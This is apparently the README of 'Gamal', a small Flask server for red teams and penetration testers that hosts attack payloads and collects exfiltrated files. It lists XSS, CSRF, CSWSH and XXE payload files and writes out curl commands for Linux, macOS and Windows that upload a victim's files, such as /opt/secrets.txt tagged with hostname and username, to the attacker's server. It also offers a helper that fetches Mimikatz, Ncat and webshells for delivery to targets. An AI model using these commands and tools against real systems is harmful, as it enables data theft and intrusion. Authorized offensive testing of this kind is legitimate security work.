# Gamal

A tiny flask app for helping red-teamers, purple teamers, and pentesters in delivery, data exfiltration, and some attacks (SSRF, XXE, XSS, Session Hijacking, Session Riding).

## Install & usage

```bash
cd /opt
git clone github.com/Fadavvi/Gamal
cd Gamal
sudo apt install python3-flask #or python3 -m pip install flask
python3 gamal.py
```  

## Arguments

```
  -h, --help       show this help message and exit
  --log LOG        Path to the log file
  --port PORT      Port / HTTPs
  --ip IP          IP e.g. : 0.0.0.0 or 127.0.0.1
  --canary CANARY  Canary token
  --cert CERT      Your fullchain.pem file
  --key KEY        Your ssl private key file
  --host HOST      Your hostname or external IP add, Format: <FQDN>:<PORT>
  --delivery       Shows available files in the ./f path for delivery. Use it in combination with --host
```

Default configuration: IP binding: `0.0.0.0`, Port: `1337`, Log: `gamal.log`, Canary-String: `booqbooqGamal`

or

`python3 gamal.py --ip <IPADDR> --port <PORTNUM> --log <LOGPATH> --canary <YourCanaryString> [--cert <FullChain> --key <PrivateKey>] [--host <FQDN>:<YourPort> --delivery]`

Then you can use your IP & Port in your payloads.

***Note:*** Add your files in `/f` folder ==>  `http://IP:PORT/f/<Your-FileName>`

## Paylods

`/f/xss.js` XSS Sample function

`/f/CORS.html` CORS sample script

`/f/CSRF.html` CSRF sample page

`/f/CSWSH.html` Cross-Site WebSocket Hijacking (CSWSH) script

`/f/meta.jpg` XSS in Meta-data

`/f/EBXXE.dtd` XXE .dtd sample file

`/f/xxe1.svg` and `/f/xxe2.svg` XXE in SVG file

## Data exfiltration

### Linux / MacOS

`curl -k -F "file=@<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`

### Windows

`Remove-Item alias:curl -ErrorAction SilentlyContinue; curl -k -F "file=@C:\<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`

### Special Parameters

If you use `user` and `host` parameters in the upload URL, they will be used in the file name. It'll help you identify the owner of the files more easily. Example:

```bash
curl -k -F "file=@/opt/secrets.txt" "https://127.0.0.1:1337/e/upload?host=$(hostname)&user=$(id -un)"
```

outputfile:

`received/{host}/{user}--{request.remote_addr}-{RealFileName}`

## Gamal helper script (additional tools)

It downloads and categorizes the most common tools for delivering to the targets (Windows / Linux / macOS)

- [Mimikatz](https://github.com/gentilkiwi/mimikatz/)
- [SharpCollection](https://github.com/Flangvik/SharpCollection/) -- Read the README file before you use it in your operations.
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/) -- agent and proxy
- [PEASS-ng](https://github.com/peass-ng/PEASS-ng/)
- [AzureHound](https://github.com/SpecterOps/AzureHound)
- [Traitor](https://github.com/liamg/traitor)
- [Ncat](https://nmap.org/ncat/)
- Basic webshells (asp / aspx / jsp / php)

## Disclaimer

 This tool is intended for use only in a legal and legitimate manner. Unfortunately, there is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.

## To do

- [ ] DNS exfiltration capability
- [ ] ICMP exfiltration capability
- [X] Improving the logging format
- [ ] Adding more tools to the helper script
